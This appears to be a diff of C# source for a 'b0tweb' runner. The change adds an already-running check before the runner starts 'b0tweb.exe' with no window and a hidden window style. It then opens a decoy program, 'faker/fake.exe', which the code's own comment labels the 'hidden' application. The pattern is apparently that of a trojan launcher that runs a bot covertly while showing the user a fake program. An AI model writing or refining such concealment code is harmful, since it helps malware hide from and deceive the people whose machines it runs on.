@@ -88,20 +88,23 @@ namespace b0tweb_runner
 
             CreateSymbolicLink(path);
 
-            ProcessStartInfo info = new ProcessStartInfo(Path.Combine(path, "b0tweb.exe"))
+            if (!IsRunning())
             {
-                RedirectStandardOutput = true,
-                UseShellExecute = false,
-                CreateNoWindow = true,
-                WindowStyle = ProcessWindowStyle.Hidden
-            };
+                ProcessStartInfo info = new ProcessStartInfo(Path.Combine(path, "b0tweb.exe"))
+                {
+                    RedirectStandardOutput = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                };
 
-            Process process = new Process()
-            {
-                StartInfo = info
-            };
+                Process process = new Process()
+                {
+                    StartInfo = info
+                };
 
-            process.Start();
+                process.Start();
+            }
 
             // Launch the "hidden" application
             Process.Start(Path.Combine(path, "faker", "fake.exe"));
